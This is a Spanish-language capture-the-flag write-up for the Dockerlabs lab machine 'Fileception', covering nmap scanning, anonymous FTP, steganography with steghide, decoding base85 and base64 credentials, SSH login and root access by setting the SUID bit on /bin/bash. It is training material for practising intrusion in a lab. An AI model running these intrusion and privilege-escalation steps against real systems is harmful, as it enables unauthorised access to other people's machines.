# Máquina Fileception

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

Creador -> [danielprz](https://rubelperez.github.io/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrw-rw-    1 ftp      ftp         75372 Apr 27 02:17 hello_peter.jpg [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 618f9189a70b8e17b7dd38e000045947 (ECDSA)
|_  256 8a152913ecaaf620cac880145605ec3b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos acceder con el usuario **anonymous** al servicio **ftp**, donde tan solo encontramos una imágen, que nos descargaremos:

```shell
ftp 172.17.0.2
Name (172.17.0.2:albertomarcostic): anonymous
----------------------
230 Login successful.
```

```shell
ftp> ls
----------------------
-rwxrw-rw-    1 ftp      ftp         75372 Apr 27 02:17 hello_peter.jpg
```

```shell
ftp> get hello_peter.jpg
----------------------
226 Transfer complete.
75372 bytes received in 0.00 secs (205.3724 MB/s)
```

Echamos un vistazo a la web principal.
En el código fuente encontramos un comentario con un pista:

![Pasted image 20240427192722](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/eadca9bf-a0b2-4b2a-a6a0-de06d6dfa0e5)

```
@UX=h?T9oMA7]7hA7]:YE+*g/GAhM4
```

--------------
## Explotación

Tras probar con varios tipos como base64,32,etc. Conseguimos decodificar la clave con **base85**.
Podemos usar cualquiera página web.

La clave decodificada es -> "**base_85_decoded_password**"

----------------

Usaremos la herramienta **steghide** para ver si hay algo escondido dentro de la imagen descargada anteriormente:
Nos pide un salvoconducto o contraseña, así que probamos a usar la clave que hemos decodificado antes:

```shell
steghide --extract -sf hello_peter.jpg
Anotar salvoconducto: (introducimos la clave -> base_85_decoded_password)
----------------------------------------------------------------------------
anot los datos extrados e/"you_find_me.txt".
```

Obtenemos un archivo **you_find_me.txt**:

Al abrirlo, encontramos el siguiente contenido:

![Pasted image 20240427200214](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/9d5f18d8-6684-4227-bf25-911b2e71bb0c)

Haciendo un poco de búsqueda en google, se trata de un tipo de lenguaje de programación esotérico.
Lo intentamos interpretar con alguna web y obtenemos la siguiente cadena de texto:

![Pasted image 20240427202355](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/864f867b-401c-4417-996a-5bd914ecbfd3)

```
9h889h23hhss2
```

Probamos esta cadena como un directorio de la web pero no funciona. La probamos como el usuario **peter** por **ssh**

```
ssh peter@172.17.0.2
```

Estamos dentro !

------------
## Escalada de privilegios

Al acceder encontramos una nota importante:

```shell
cat nota_importante.txt 
-----------------------------------
NO REINICIES EL SISTEMA!!

HAY UN ARCHIVO IMPORTANTE EN TMP
```

Accedemos al directorio **/tmp** donde hay mas archivos:

```shell
cat recuerdos_del_sysadmin.txt 
------------------------------------------------
Cuando era niño recuerdo que, a los videos, para pasarlos de flv a mp4, solo cambiaba la extensión. Que iluso.
```

Encontramos otro archivo **importante_octopus.odt**
Nos lo descargamos en la máquina atacante con **scp**.

```shell
scp peter@172.17.0.2:/tmp/importante_octopus.odt ./
```

Probamos a cambiarle las extensiones, txt, sh, tar, zip, etc. Para ver como se comporta.
Tras varios intentos, con **zip**, al descomprimirlo, obtenemos varios archivos.

```shell
mv importante_octopus.odt importante_octopus.zip
```

Entre ellos un **leerme-xml**.

```shell
cat leerme.xml
-------------------------------
Decirle a Peter que me pase el odt de mis anécdotas, en caso de que se me olviden mis credenciales de administrador... Él no sabe de Esteganografía, nunca sé lo imaginaria esto.

usuario: octopus
password: ODBoMjM4MGgzNHVvdW8zaDQ=
```

Obtenemos las credenciales del user **octopus**, pero parece que su contraseña es **base64**, así que la decodificamos:

```shell
echo "ODBoMjM4MGgzNHVvdW8zaDQ=" | base64 -d; echo
-----------------------------------------------------
80h2380h34uouo3h4
```

Nos conectamos como el usuario **octopus** por ssh -> **octopus:80h2380h34uouo3h4**

```ssh
ssh octopus@172.17.0.2
```

Ejecutamos **sudo -l** para ver si podemos ejecutar algo como root:

```shell
sudo -l
--------------------
User octopus may run the following commands on 154c6f2b3e10:
    (ALL) NOPASSWD: ALL
    (ALL : ALL) ALL
```

Podemos ejecutar cualquier cosa como root:

```shell
sudo chmod u+s /bin/bash
bash -p
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximos en la máquina !
